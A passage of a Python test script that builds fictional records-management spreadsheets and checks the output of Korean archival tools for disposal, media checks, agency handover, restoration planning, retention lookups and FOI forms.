    xlsx(f"{t}/심의결과.xlsx", [["관리번호", "제목", "생산부서", "보존기간", "종료연도", "심의 결과", "재책정 보존기간", "보류기간", "사유", "기록물형태"],
                            ["D-1", "행사", "총무과", "3년", "2022", "폐기", "", "", "보존 가치 없음", "전자"],
                            ["D-2", "공사 설계", "건설과", "10년", "2015", "보존기간 재책정", "준영구", "", "시설 관리", "비전자"],
                            ["D-3", "소송 관련", "법무과", "5년", "2020", "보류", "", "2년", "소송 진행", ""],
                            ["D-4", "민원", "민원과", "5년", "2019", "보존기간 재책정", "10년", "", "", ""],
                            ["D-5", "회의", "총무과", "3년", "2022", "폐기", "", "", "중복", "종이"],
                            ["D-6", "기타", "총무과", "1년", "2024", "", "", "", "", ""]])
    cdi, odi = run([S("disposal-dossier", "scripts", "disposition_result.py"), f"{t}/심의결과.xlsx", "--year", "2026", "--cert-count", "3",
                    "-o", f"{t}/산출/처분결과.xlsx"])
    ok_di = False
    if cdi == 0:
        wdi = openpyxl.load_workbook(f"{t}/산출/처분결과.xlsx")
        rr = {r[0]: r for r in wdi["처분결과 등록(7.6)"].iter_rows(min_row=2, values_only=True)}
        dd = [r for r in wdi["폐기 집행 대조(8.1~8.2)"].iter_rows(min_row=2, values_only=True) if isinstance(r[0], int)]
        vv = [r for r in wdi["위탁 폐기 점검(8.4)"].iter_rows(values_only=True)]
        ok_di = ("2021년 이관" in str(rr["D-2"][9]) and "이미 도래" in str(rr["D-2"][9]) and rr["D-3"][9] == "2028년 다시 평가"
                 and rr["D-4"][9].startswith("2030년") and "사유 없음" in str(rr["D-4"][10]) and "읽지 못함" in str(rr["D-6"][10])
                 and [r[1] for r in dd] == ["D-1", "D-5"] and "0.25mm" in dd[0][7] and "파쇄" in dd[1][7] and vv[-1][1] == "불일치")
    check("처분결과: 준영구 재책정→이관 연도, 보류 재평가 연도, 10년 재책정 다음 평가, 사유·결과 누락, 폐기 방법·증명서 수량", ok_di, odi)

    # 기록매체(NAK 12): 대장 점검, 부속서 D 간이 검사
    xlsx(f"{t}/매체대장.xlsx", [["매체번호", "매체종류", "용도", "수록일", "마지막점검일", "마지막되감기일", "용량", "사용량", "보호수단"],
                             ["M-1", "DVD-R", "보존", "2020-01-01", "2026-03-01", "", "4.7GB", "4.5GB", "WORM"],
                             ["M-2", "DVD-RW", "보존", "2020-01-01", "2026-03-01", "", "4.7GB", "2GB", ""],
                             ["M-3", "USB 메모리", "임시", "2024-01-01", "2025-06-01", "", "64GB", "10GB", ""],
                             ["M-4", "LTO-6 자기테이프", "보존", "2012-01-01", "", "2020-01-01", "2.5TB", "1TB", "쓰기방지"],
                             ["M-5", "플로피디스켓", "보존", "1995-01-01", "", "", "", "", ""]])
    cmi, omi = run([S("media-check", "scripts", "media_inventory.py"), f"{t}/매체대장.xlsx", "--today", "2026-11-20", "-o", f"{t}/산출/매체.xlsx"])
    ok_mi = False
    if cmi == 0:
        mi = {r[0]: r for r in openpyxl.load_workbook(f"{t}/산출/매체.xlsx")["매체 점검"].iter_rows(min_row=2, values_only=True)}
        ok_mi = (mi["M-1"][9] == "주의" and "4/5" in mi["M-1"][10] and mi["M-2"][9] == "조치 필요" and "-R/+R" in mi["M-2"][10]
                 and mi["M-3"][9] == "조치 필요" and "1년" in mi["M-3"][10] and "3년" in mi["M-4"][10] and "10년" in mi["M-4"][10]
                 and mi["M-5"][9] == "조치 필요")
    os.makedirs(f"{t}/매체/sub")
    open(f"{t}/매체/a.txt", "w").write("가" * 1000)
    open(f"{t}/매체/sub/b.bin", "wb").write(os.urandom(5000))
    cmv, omv = run([S("media-check", "scripts", "media_verify.py"), f"{t}/매체", f"{t}/산출/매체복사", "--report", f"{t}/산출/매체검사.csv"])
    cmv2, omv2 = run([S("media-check", "scripts", "media_verify.py"), f"{t}/매체", f"{t}/산출/매체복사"])
    check("기록매체 NAK 12: RW 금지·4/5·반도체 1년·테이프 3년 되감기·플로피, 간이 검사(복사 전후·해시) 통과, 비지 않은 대상 거부",
          ok_mi and cmv == 0 and "이상 없음" in omv and cmv2 == 2, omi + omv + omv2)

    # 한시·폐지기관 인계인수(NAK 15)
    xlsx(f"{t}/폐지목록.xlsx", [["생산기관", "처리과", "기록물철제목", "수량", "생산연도", "보존기간", "기록물형태", "공개여부", "비공개사유", "저작권동의"],
                             ["가상위원회", "총무과", "운영 계획", "1", "2025", "5년", "문서", "공개", "", ""],
                             ["가상위원회", "조사과", "조사 결과", "1", "2025", "영구", "문서", "비공개", "", ""],
                             ["가상위원회", "홍보과", "행사 사진", "120", "2025", "준영구", "사진", "공개", "", ""],
                             ["가상위원회", "총무과", "현판", "1", "2024", "", "행정박물", "", "", ""]])
    xlsx(f"{t}/통합A.xlsx", [["부서명", "기능유형", "단위과제명", "단위과제설명", "보존기간", "단위과제카드", "업무담당자", "보존기간확정여부"],
        ["감사담당관", "공통", "자체감사실시", "자체감사", "5년", "감사카드", "김", "Y"], ["기획과", "고유", "지역발전 기본계획 수립", "계획", "10년", "카드", "이", "Y"],
        ["기획과", "고유", "지역발전 기본계획 수립", "계획", "10년", "카드", "이", "Y"], ["총무과", "공통", "청사관리", "청사", "10년", "", "", "N"]])
    xlsx(f"{t}/통합B.xlsx", [["부서명", "기능유형", "단위과제명", "단위과제설명", "보존기간", "단위과제카드", "업무담당자", "보존기간확정여부"],
        ["감사실", "공통", "자체 감사 실시", "감사", "10년", "c", "박", "Y"], ["정책과", "공통", "지역발전기본계획수립", "계획", "30년", "c", "최", "Y"],
        ["교통과", "고유", "버스노선 조정", "노선", "10년", "c", "정", "Y"]])
    cms, oms = run([S("agency-closure", "scripts", "merge_schedule.py"), f"{t}/통합A.xlsx", f"{t}/통합B.xlsx", "--names", "가시,나시", "--type", "지방자치단체", "-o", f"{t}/산출/통합기록관리표.xlsx"])
    wm = openpyxl.load_workbook(f"{t}/산출/통합기록관리표.xlsx") if os.path.exists(f"{t}/산출/통합기록관리표.xlsx") else None
    cmpr = {(r[1] or "") + "|" + (r[6] or ""): r for r in wm["단위과제비교표"].iter_rows(min_row=2, values_only=True)} if wm else {}
    prer = " ".join(str(c) for r in wm["사전 정비 대상"].iter_rows(values_only=True) for c in r if c) if wm else ""
    au = cmpr.get("자체감사실시|자체 감사 실시", [""] * 17)
    check("기관 통폐합 통합 기록관리표: 사전 정비(중복·카드 없음·미확정)·③⑦⑥ 문제유형·준칙 준용·단독 업무",
          cms == 1 and "③ 명칭" in str(au[13]) and "⑦" in str(au[13]) and "⑥ 가시(5년)" in str(au[13]) and au[16] == "10년" and "자체감사실시" in str(au[15])
          and "같은 부서 안 중복" in prer and "단위과제카드 없음" in prer and "미확정" in prer
          and any("나시에만" in str(r[13]) for r in cmpr.values()) and cmpr.get("지역발전 기본계획 수립|지역발전기본계획수립", [""] * 17)[16] == "30년", oms + str(au))
    xlsx(f"{t}/통합C.xlsx", [["부서명", "기능유형", "단위과제명", "단위과제설명", "보존기간"], ["감사관", "공통", "자체감사 실시", "감사", "3년"], ["관광과", "고유", "축제 운영", "축제", "5년"]])
    cm3, om3 = run([S("agency-closure", "scripts", "merge_schedule.py"), f"{t}/통합A.xlsx", f"{t}/통합B.xlsx", f"{t}/통합C.xlsx", "--names", "가시,나시,다군",
                    "--type", "지방자치단체", "-o", f"{t}/산출/통합기록관리표3.xlsx"])
    w3 = openpyxl.load_workbook(f"{t}/산출/통합기록관리표3.xlsx") if os.path.exists(f"{t}/산출/통합기록관리표3.xlsx") else None
    r3 = [r for r in w3["단위과제비교표"].iter_rows(min_row=2, values_only=True)] if w3 else []
    aud = next((r for r in r3 if r[1] == "자체감사실시"), [""] * 22)
    check("기관 통폐합 3개 기관(행정통합): 같은 과제 한 줄로 묶음·세 기관 보존기간 비대칭·준칙 준용",
          cm3 == 1 and aud[11] == "자체감사 실시" and "⑦ 보존기간 비대칭(5년/10년/3년)" in str(aud[18]) and aud[21] == "10년"
          and any("다군에만" in str(r[18]) for r in r3), om3 + str(aud))

    cch, och = run([S("agency-closure", "scripts", "closure_handover.py"), f"{t}/폐지목록.xlsx", "--type", "폐지-승계없음", "--org", "가상위원회",
                    "--to", "가상기록원", "--done", "2026-12-15", "-o", f"{t}/산출/인계인수.xlsx"])
    ok_ch = False
    if cch == 0:
        wc = openpyxl.load_workbook(f"{t}/산출/인계인수.xlsx")
        doc = {r[3]: r for r in wc["이관목록-문서(부속서 C)"].iter_rows(min_row=2, values_only=True)}
        av_ = {r[3]: r for r in wc["이관목록-시청각(부속서 C)"].iter_rows(min_row=2, values_only=True)}
        hbb = [r for r in wc["인계인수서(부속서 B)"].iter_rows(values_only=True)]
        scc = " ".join(str(c) for r in wc["일정"].iter_rows(values_only=True) for c in r if c)
        ok_ch = ("폐기 금지" in str(doc["운영 계획"][10]) and "사유 없음" in str(doc["조사 결과"][10]) and "저작권" in str(av_["행사 사진"][12])
                 and hbb[-1][1] == 123 and "2027-03-15" in scc and "행정박물" in [x for x in wc.sheetnames if "행정박물" in x][0])
    check("한시·폐지기관 NAK 15: 승계 없으면 10년 이하 폐기 금지, 비공개 사유·저작권 빈칸, 인계인수서 수량, 3개월 통보 기한", ok_ch, och)

    # 복원처리 계획(NAK 25 부속서 C·7.2)
    xlsx(f"{t}/상태결과.xlsx", [["관리번호", "제목", "훼손도", "중요도", "활용도", "pH", "대형", "재난피해", "상태"],
                             ["C-1", "지적 원도", "3등급", "상", "상", "5.8", "", "", ""], ["C-2", "회의록", "3등급", "중", "하", "7.2", "", "", ""],
                             ["C-3", "침수 대장", "2등급", "", "", "", "", "예", ""], ["C-4", "공문", "1등급", "하", "하", "6.9", "", "", "바스러짐"],
                             ["C-5", "도면", "2등급", "중", "중", "7.0", "예", "", ""]])
    crp, orp = run([S("preservation-inspection", "scripts", "restoration_plan.py"), f"{t}/상태결과.xlsx", "-o", f"{t}/산출/복원계획.xlsx"])
    ok_rp = False
    if crp == 0:
        rp_ = [r for r in openpyxl.load_workbook(f"{t}/산출/복원계획.xlsx")["복원처리 계획"].iter_rows(min_row=2, values_only=True)]
        byp = {r[1]: r for r in rp_}
        ok_rp = ([r[1] for r in rp_][:2] == ["C-3", "C-1"] and byp["C-1"][7] == "심화복원" and byp["C-1"][8] == "대상" and byp["C-2"][7] == "예방복원"
                 and byp["C-5"][7] == "예방복원" and byp["C-4"][7] == "보존 관리" and byp["C-4"][8] == "대상" and byp["C-3"][7] == "응급복원")
    check("복원처리 NAK 25: 응급→심화(3등급·상·상)→예방(3등급·대형), pH 6.5 이하·바스러짐 탈산", ok_rp, orp)
    xlsx(f"{t}/탈산이력.xlsx", [["관리번호", "제목", "훼손도", "pH", "탈산연도", "상태"],
                             ["T-1", "가", "2등급", "6.2", "2008", ""], ["T-2", "나", "2등급", "", "2010", "백화"], ["T-3", "다", "2등급", "8.5", "2012", ""]])
    ctd, otd = run([S("preservation-inspection", "scripts", "restoration_plan.py"), f"{t}/탈산이력.xlsx", "-o", f"{t}/산출/탈산이력.xlsx"])
    td_ = {r[1]: " ".join(str(c) for c in r if c) for r in openpyxl.load_workbook(f"{t}/산출/탈산이력.xlsx")["복원처리 계획"].iter_rows(min_row=2, values_only=True)} if ctd == 0 else {}
    check("탈산 처리 기록물 사후평가(국가기록원 탈산 상태평가 연구): pH 6.8 미만 재탈산, 표본 3곳 측정, 백화현상",
          "6.8" in td_.get("T-1", "") and "1/4" in td_.get("T-2", "") and "백화현상" in td_.get("T-2", "") and "재탈산" not in td_.get("T-3", ""), otd + str(td_))

    # 목록 작성·디지털화 검수(NAK 23)
    xlsx(f"{t}/색인검수.xlsx", [["철관리번호", "철제목", "권호", "보존기간", "등록번호", "건제목", "생산일자", "시작쪽", "끝쪽", "작업자", "작업일"],
                             ["L-1", "예산", "1", "영구", "E-1", "가", "2020-01-05", "1", "3", "김", "2026-11-01"],
                             ["L-1", "예산", "1", "영구", "E-2", "나", "2020-02-05", "4", "6", "김", "2026-11-01"],
                             ["L-1", "예산", "1", "영구", "E-3", "다", "2020-01-20", "8", "9", "김", "2026-11-01"],
                             ["L-1", "예산", "2", "영구", "E-4", "라", "2020-03-01", "1", "2", "이", "2026-11-01"],
                             ["L-2", "행사", "1", "3년", "E-5", "마", "2021-05-01", "1", "2", "이", "2026-11-02"],
                             ["L-2", "행사", "1", "3년", "E-6", "", "2021-03-01", "3", "3", "이", "2026-11-02"]])
    os.makedirs(f"{t}/색인이미지/E-1")
    for i in range(3):
        open(f"{t}/색인이미지/E-1/{i}.tif", "wb").write(b"II*\0")
    for i in range(2):
        open(f"{t}/색인이미지/E-2_{i + 1}.jpg", "wb").write(b"\xff\xd8")
    clq, olq = run([S("listing-qa", "scripts", "listing_qa.py"), f"{t}/색인검수.xlsx", "--images", f"{t}/색인이미지", "--checked", "2000", "--errors", "3",
                    "-o", f"{t}/산출/목록검수.xlsx"])
    ok_lq = False
    if os.path.exists(f"{t}/산출/목록검수.xlsx"):
        wlq = openpyxl.load_workbook(f"{t}/산출/목록검수.xlsx")
        iss = [(r[3], r[4], r[5]) for r in wlq["검수 결과"].iter_rows(min_row=2, values_only=True)]
        txt = " | ".join(f"{a_}:{b_}:{c_}" for a_, b_, c_ in iss)
        qq = {r[0]: r for r in wlq["품질 수준"].iter_rows(min_row=2, values_only=True)}
        sp_ = [r for r in wlq["표본"].iter_rows(min_row=2, values_only=True) if isinstance(r[2], int)]
        ok_lq = (clq == 1 and "E-3:면표시:7~7쪽 빠짐" in txt and "E-4:면표시:2권 첫 쪽 1 — 10쪽부터" in txt and "E-3:편철 순서" in txt
                 and "E-6:필수 항목" in txt and "E-2:이미지 수:쪽수 3 · 이미지 2" in txt and "E-1:이미지 수" not in txt
                 and "미달" in str(qq["정확도"][2]) and len(sp_) == 3 and "E-5:편철 순서" not in txt)
    check("목록 검수 NAK 23: 면표시 빠짐·분권 이어짐, 보존기간별 편철 순서, 필수 항목, 쪽수↔이미지, 작업자별 표본, 99.9%", ok_lq, olq)

    # 연간 업무 일정·수준 점검(NAK 18)
    cyp, oyp = run([S("evaluation-readiness", "scripts", "yearly_plan.py"), "--year", "2027", "--staff", "5", "--experts", "1",
                    "--ics", f"{t}/산출/일정2027.ics", "-o", f"{t}/산출/연간2027.xlsx"])
    ok_yp = False
    if cyp == 0:
        icsx = open(f"{t}/산출/일정2027.ics", encoding="utf-8", newline="").read()
        lvv = [r for r in openpyxl.load_workbook(f"{t}/산출/연간2027.xlsx")["수준 체크리스트"].iter_rows(values_only=True)]
        ok_yp = (icsx.startswith("BEGIN:VCALENDAR") and "DTSTART;VALUE=DATE:20271031" in icsx and "DTSTART;VALUE=DATE:20270831" in icsx and "DTSTART;VALUE=DATE:20270531" in icsx and "DTSTART;VALUE=DATE:20270630" in icsx and icsx.count("BEGIN:VEVENT") >= 18
                 and "\r\n" in icsx and any(r and r[0] == "인력 배치" and r[2] == "미달" and "2명" in r[1] for r in lvv) and lvv[-1][0] == "교육")
    check("연간 일정 NAK 18: 월별 업무·5/31(제33조)·6/30·8/31·10/31 기한 .ics, 수준 체크리스트, 전문요원 1/4", ok_yp, oyp)

    # 과거 공문서 분류번호 → 당시 보존기간(1985·1992·1997 표)
    xlsx(f"{t}/옛철.xlsx", [["관리번호", "분류번호", "생산연도", "제목", "보존기간"],
                          ["L-1", "01000", "1988", "기본정책방침 관계철", "10년"], ["L-2", "02110", "1994", "한국표준산업분류 개정", "10년"],
                          ["L-3", "20112", "1998", "임차대장", "5년"], ["L-4", "99999", "1993", "가상", "3년"], ["L-5", "01000", "1980", "옛 철", ""], ["L-7", "127", "1970", "보존문서 기록대장", "10년"], ["L-8", "111", "1981", "장기계획관계문서", "3년"], ["L-9", "111-24", "1982", "기본운영계획 수정", "1년"], ["L-10", "111-99", "1982", "계획", "3년"],
                          ["L-6", "01000", "2005", "새 철", ""]])
    clg, olg = run([S("retention-review", "scripts", "legacy_lookup.py"), f"{t}/옛철.xlsx", "-o", f"{t}/산출/옛철.xlsx"])
    lg = {r[1]: r for r in openpyxl.load_workbook(f"{t}/산출/옛철.xlsx")["대조"].iter_rows(min_row=2, values_only=True)} if os.path.exists(f"{t}/산출/옛철.xlsx") else {}
    check("과거 공문서 분류번호(1964·1985·1992·1997표): 판 고르기·당시 보존기간·지금보다 길면 표시·번호 없음·범위 밖 연도",
          clg == 1 and lg["L-1"][5] == "1985" and "영구" in str(lg["L-1"][10]) and "짧음" in str(lg["L-1"][10])
          and lg["L-2"][5] == "1992" and "10년" in str(lg["L-2"][10]) and "짧음" not in str(lg["L-2"][10])
          and lg["L-3"][5] == "1997" and "짧음" in str(lg["L-3"][10]) and "없음" in str(lg["L-4"][10])
          and lg["L-5"][5] == "1979" and "10년" in str(lg["L-8"][8]) and "짧음" in str(lg["L-8"][10]) and "기본운영계획" in str(lg["L-9"][6]) and "3년" in str(lg["L-9"][7]).split("/")[0] and "짧음" in str(lg["L-9"][10]) and "없음" in str(lg["L-10"][10]) and lg["L-7"][5] == "1964" and "영구" in str(lg["L-7"][10]) and "짧음" in str(lg["L-7"][10]) and "2000년 이후" in str(lg["L-6"][10]), olg + str({k: v[10] for k, v in lg.items()}))

    # 중앙행정기관 고유업무 보존기간 준칙(2021) 대조
    xlsx(f"{t}/환경기준표.xlsx", [["단위과제코드", "단위과제명", "보존기간"], ["X1", "기본계획 추진실적 작성", "10년"],
                                ["X2", "시행계획의 적정성 검토", "30년"], ["X3", "가상 전혀 다른 과제", "5년"]])
    cuq, ouq = run([S("retention-review", "scripts", "unique_task_lookup.py"), f"{t}/환경기준표.xlsx", "--org", "환경부", "-o", f"{t}/산출/고유대조.xlsx"])
    uq = {r[1]: r for r in openpyxl.load_workbook(f"{t}/산출/고유대조.xlsx")["대조"].iter_rows(min_row=2, values_only=True)} if os.path.exists(f"{t}/산출/고유대조.xlsx") else {}
    check("중앙행정기관 고유업무 준칙(2021) 대조: 이름 맞춤·짧은 보존기간 표시·같음·안 맞는 과제 제외", cuq == 1
          and "짧음" in str(uq.get("X1", [""] * 10)[9]) and uq.get("X2", [""] * 10)[9] == "같음" and "X3" not in uq, ouq + str(uq))
    xlsx(f"{t}/감사기준표.xlsx", [["단위과제코드", "단위과제명", "보존기간"], ["Y1", "공공기관 결산검사 보고", "10년"]])
    cu12, ou12 = run([S("retention-review", "scripts", "unique_task_lookup.py"), f"{t}/감사기준표.xlsx", "--org", "감사원", "--edition", "2012", "-o", f"{t}/산출/고유대조12.xlsx"])
    u12 = {r[1]: r for r in openpyxl.load_workbook(f"{t}/산출/고유대조12.xlsx")["대조"].iter_rows(min_row=2, values_only=True)} if os.path.exists(f"{t}/산출/고유대조12.xlsx") else {}
    check("중앙행정기관 고유업무 준칙 2012판(--edition 2012) 대조", cu12 == 1 and u12.get("Y1", [""] * 10)[6] == "영구" and "짧음" in str(u12.get("Y1", [""] * 10)[9]), ou12 + str(u12))
    # 기관별 기록물분류기준표(2005~2012 PDF) 색인·읽기·대조
    csp, osp = run([S("retention-review", "scripts", "scheme_pdf_lookup.py"), "--org", "강릉시", "--year", "2009"])
    sp_find = csp == 0 and "2008-01-31" in osp and "2009년 말 시행 중" in osp.split("2008-01-31")[1].split("\n")[0]
    try:
        from reportlab.pdfgen import canvas as _cv
        from reportlab.pdfbase import pdfmetrics as _pm
        from reportlab.pdfbase.cidfonts import UnicodeCIDFont as _cf
        import pdfplumber  # noqa: F401
        _pm.registerFont(_cf("HYSMyeongJo-Medium"))
        cv = _cv.Canvas(f"{t}/분류기준표.pdf")
        cv.setFont("HYSMyeongJo-Medium", 9)
        for k, ln in enumerate(["가상시 기록물분류기준표 보졲 기갂",
                                "4200075 가상시 민원과 총무행정 행정관리 행정관리기타 ZA000017 관인관리 영구 원본 자료관",
                                "4200075 가상시 민원과 지방자치 주민참여 읍면동주민자치 PA214533 젂세확정일자부여 10년 원본 자료관",
                                "4200075 가상시 민원과 지방자치 지방산업 지역산업 PA001210 가스안젂관리 20 원본 기록관 없음",
                                "C185006 가상대학교 교육 학사행정 학사관리 HB000075 각종행사 5년 원본 기록관 없음",
                                "1234567 가상청 A0000019 기획 B0000064 기획관리 C0000339 기획관리운영 AA007626 간부회의 1년 원본 자료관"]):
            cv.drawString(40, 800 - 14 * k, ln)
        cv.save()
        xlsx(f"{t}/분류목록.xlsx", [["단위업무코드", "단위업무명", "보존기간"], ["PA214533", "전세확정일자부여", "5년"], ["ZA000017", "관인관리", "영구"], ["PA999999", "가상", "3년"]])
        csp2, osp2 = run([S("retention-review", "scripts", "scheme_pdf_lookup.py"), "--pdf", f"{t}/분류기준표.pdf", "--list", f"{t}/분류목록.xlsx", "-o", f"{t}/산출/분류기준표대조.xlsx"])
        wsp = openpyxl.load_workbook(f"{t}/산출/분류기준표대조.xlsx") if os.path.exists(f"{t}/산출/분류기준표대조.xlsx") else None
        dz = {r[1]: r for r in wsp["대조"].iter_rows(min_row=2, values_only=True)} if wsp else {}
        rd = {r[3]: r for r in wsp["분류기준표"].iter_rows(min_row=2, values_only=True)} if wsp else {}
        sp_pdf = (csp2 == 1 and "짧음" in str(dz.get("PA214533", [""] * 7)[6]) and dz.get("ZA000017", [""] * 7)[6] == "같음"
                  and "없음" in str(dz.get("PA999999", [""] * 7)[6]) and rd.get("PA214533", [""] * 7)[4] == "전세확정일자부여"
                  and rd.get("PA001210", [""] * 7)[5] == "20년" and rd.get("HB000075", [""] * 7)[1] == "C185006"
                  and rd.get("AA007626", [""] * 7)[4] == "간부회의" and "B0000064" in str(rd.get("AA007626", [""] * 7)[2]))
        osp += osp2 + str(dz) + str(rd)
    except ImportError:
        sp_pdf = True  # reportlab·pdfplumber 없으면 PDF 부분은 건너뜀
    check("기록물분류기준표 PDF: 판 찾기(그해 말 시행 판)·읽기(글자 보정·줄 넘김)·목록 대조", sp_find and sp_pdf, osp)
    # 옛 공통업무 보존기간표(2008·2022 지자체) → 지금 공통업무 준칙
    xlsx(f"{t}/공통이력.xlsx", [["단위과제명", "보존기간"], ["부내 부분감사", "5년"], ["감사카드", "10년"], ["사무분장", "5년"],
                               ["(기관공통)감사결과처리", "10년"], ["가상 전혀 다른 과제", "3년"]])
    cch, och = run([S("retention-review", "scripts", "common_history_lookup.py"), f"{t}/공통이력.xlsx", "-o", f"{t}/산출/공통이력.xlsx"])
    ch = {r[1]: r for r in openpyxl.load_workbook(f"{t}/산출/공통이력.xlsx")["대조"].iter_rows(min_row=2, values_only=True)} if os.path.exists(f"{t}/산출/공통이력.xlsx") else {}
    check("옛 공통업무 보존기간표(2008·2022) 개정 이력 → 지금 준칙 과제·보존기간", cch == 1
          and "ANG0001" in str(ch.get("부내 부분감사", [""] * 12)[8]) and "짧음" in str(ch.get("부내 부분감사", [""] * 12)[11])
          and "폐지" in str(ch.get("감사카드", [""] * 12)[11]) and ch.get("사무분장", [""] * 12)[11] == "같은 흐름"
          and "PNG0001" in str(ch.get("(기관공통)감사결과처리", [""] * 12)[8]) and "가상 전혀 다른 과제" not in ch, och + str(ch))

    # 2026 지침 수행업무 리스트 점검표
    ckp, okp = run([S("evaluation-readiness", "scripts", "task_checklist.py"), "--kind", "공공기관", "-o", f"{t}/산출/수행업무_공공.xlsx"])
    cku, oku = run([S("evaluation-readiness", "scripts", "task_checklist.py"), "--kind", "대학", "--role", "기록관", "-o", f"{t}/산출/수행업무_대학.xlsx"])
    tp = [r for r in openpyxl.load_workbook(f"{t}/산출/수행업무_공공.xlsx")["점검표"].iter_rows(min_row=3, values_only=True)]
    check("수행업무 점검표 --kind: 2026 공공기관 지침(처리과 28·기록관 21, 책임자 지정 1-1)·대학 지침(기록관 18)",
          ckp == 0 and cku == 0 and len(tp) == 49 and tp[0][3] == "처리과 기록물관리책임자가 지정되어 있는지?" and "기록관 18개" in oku, okp + oku)
    ctk, otk = run([S("evaluation-readiness", "scripts", "task_checklist.py"), "--role", "처리과", "-o", f"{t}/산출/수행업무.xlsx"])
    tk_ok = False
    if ctk == 0:
        wtk = openpyxl.load_workbook(f"{t}/산출/수행업무.xlsx")
        ws_ = wtk["점검표"]
        rows_ = [r for r in ws_.iter_rows(min_row=3)]
        for i, r in enumerate(rows_):
            r[4].value = "O" if i % 2 == 0 else ("X" if i % 3 else None)
        wtk.save(f"{t}/산출/수행업무_채움.xlsx")
        crk, ork = run([S("evaluation-readiness", "scripts", "task_checklist.py"), "--results", f"{t}/산출/수행업무_채움.xlsx", "-o", f"{t}/산출/수행업무_결과.xlsx"])
        sm = [r for r in openpyxl.load_workbook(f"{t}/산출/수행업무_결과.xlsx")["요약"].iter_rows(values_only=True)]
        notes_ = {r[2].value: r[6].value for r in rows_}
        tk_ok = (len(rows_) == 28 and crk == 1 and sm[1][0] == "처리과" and sm[1][1] == 28 and sm[1][2] == 14 and "2027" in str(notes_.get("3-5")))
    check("2026 지침 수행업무 점검표: 처리과 28항목·O/X 결과 수행률·미수행, 법령 변경 비고(3-5 이관 연장)", tk_ok, otk)

    # 기록물 기술 점검(NAK 13)
    xlsx(f"{t}/기술목록.xlsx", [["참조코드", "상위참조코드", "제목", "일자", "기술계층", "생산자명", "범위와내용", "규모", "종류"],
                             ["G1", "", "가상청 기록물군", "1960-2006", "기록물군", "가상청", "가상청 기록", "", ""],
                             ["S1", "G1", "인사 계열", "1955-1975", "기록물계열", "가상청", "인사", "", ""],
                             ["F1", "S1", "인사 발령철", "1960/03/01-1960/12/31", "기록물철", "가상청", "발령", "", ""],
                             ["I1", "F1", "발령 통지", "단기4293년", "기록물건", "가상청", "", "", ""],
                             ["I2", "F1", "전산 파일", "1960/05/02", "건", "가상청", "파일", "3개", "전자"]])
    cdc, odc = run([S("archival-description", "scripts", "description_check.py"), f"{t}/기술목록.xlsx", "-o", f"{t}/산출/기술점검.xlsx"])
    ok_dc = False
    if os.path.exists(f"{t}/산출/기술점검.xlsx"):
        dcx = [(r[1], r[3], r[5]) for r in openpyxl.load_workbook(f"{t}/산출/기술점검.xlsx")["점검 결과"].iter_rows(min_row=2, values_only=True)]
        txt = " | ".join(f"{a_}:{b_}:{c_}" for a_, b_, c_ in dcx)
        ok_dc = (cdc == 1 and "S1:상위 계층 일자" in txt and "F1:계층별 일자:1960-1960" in txt and "I1:필수요소" in txt and "I1:일자 표기:1960" in txt
                 and "I2:기술계층" in txt and "I2:규모" in txt and not any(c == "G1" for c, _, _ in dcx))
    check("기술 NAK 13: 필수요소, 연호→서기, 철은 연도만, 상위 범위, 계층 값, 전자 용량 단위", ok_dc, odc)

    # 정보공개 서식·통계·수수료(시행규칙 별표·별지 4·11·12)
    xlsx(f"{t}/청구서식.xlsx", [["접수번호", "청구일", "정보내용", "공개방법", "청구방법", "담당부서", "결정", "비공개사유", "결정일", "공개일", "수령방법",
                              "사본규격", "사본장수", "열람시간", "변환", "지움", "이의신청일", "사건명"],
                             ["F-1", "2026-03-02", "예산서", "사본·출력물", "정보통신망", "기획과", "공개", "", "2026-03-05", "2026-03-06", "우편", "A3 이상", "12", "", "", "", "", ""],
                             ["F-2", "2026-03-02", "감사 결과", "전자파일", "정보통신망", "감사과", "부분공개", "제6호 개인 성명·주소", "2026-03-20", "", "정보통신망",
                              "B4 이하", "30", "", "", "예", "2026-03-25", "감사 결과 부분공개 이의"],
                             ["F-3", "2026-04-01", "계획안", "열람", "직접 출석", "기획과", "비공개", "제5호", "2026-04-30", "", "", "", "", "130", "", "", "", ""]])
    cff, off = run([S("access-request", "scripts", "foi_forms.py"), f"{t}/청구서식.xlsx", "--year", "2026", "-o", f"{t}/산출/정보공개서식.xlsx"])
    ok_ff = False
    if cff == 0:
        wff = openpyxl.load_workbook(f"{t}/산출/정보공개서식.xlsx")
        p4 = {r[0]: r for r in wff["별지 제4호 처리대장"].iter_rows(min_row=3, values_only=True)}
        p12 = [r for r in wff["별지 제12호 운영실태"].iter_rows(values_only=True)]
        tot = [r for r in p12 if r and r[0] == "계"]
        p11 = [r for r in wff["별지 제11호 이의신청 처리대장"].iter_rows(min_row=3, values_only=True)]
        ok_ff = (p4["F-1"][13] == 1400 and p4["F-2"][13] == 1700 and p4["F-3"][13] == 3000 and p4["F-1"][2] == "(정보공개시스템)"
                 and "단계" in str(p4["F-3"][15]) and "짧음" in str(p4["F-3"][15]) and tot[0][1:5] == (3, 1, 1, 1) and tot[4][1:6] == (3, 0, 1, 1, 1)
                 and tot[5][6] == 1 and tot[5][7] == 1 and len(p11) == 1)
    check("정보공개 서식: 별표 수수료(A3 첫장+추가·지움=사본 동일·열람 1시간 초과), 처리대장·이의신청대장, 운영실태 총괄·결정기간·사유별", ok_ff, off)

    # 공문서 표기(행정업무규정 제7조, 시행규칙 제2조·제4조)
    with open(f"{t}/공문.txt", "w", encoding="utf-8") as fh:
        fh.write("행사 계획\n1. 일시: 2026년 11월 20일 오후 2시 30분\n2. 장소: 대회의실\n4. 예산: 113,560원\n  가. 인쇄비: 금50,000원(금오만원)\n"
                 "  나. 다과비: 금63,560원(금육만삼천원)\n  라. 기타\n    1) 회의 2026-12-01\n    (1) 세부\n\n붙임  계획서 1부.\n      2. 명단\n본문 끝  끝\n")
    with open(f"{t}/공문2.txt", "w", encoding="utf-8") as fh:
        fh.write("회의 개최 알림\n1. 일시: 2026. 11. 20. 14:30\n2. 예산: 금113,560원(금일십일만삼천오백육십원)\n  가. 장소\n  나. 참석\n\n붙임  1. 계획서 1부.\n      2. 명단 1부. 끝.\n")
    cdk, odk = run([S("official-doc-check", "scripts", "doc_check.py"), f"{t}/공문.txt", f"{t}/공문2.txt", "-o", f"{t}/산출/공문점검.xlsx"])
    ok_dk = False
    if os.path.exists(f"{t}/산출/공문점검.xlsx"):
        dk = [(r[0], r[2], r[4]) for r in openpyxl.load_workbook(f"{t}/산출/공문점검.xlsx")["점검 결과"].iter_rows(min_row=2, values_only=True)]
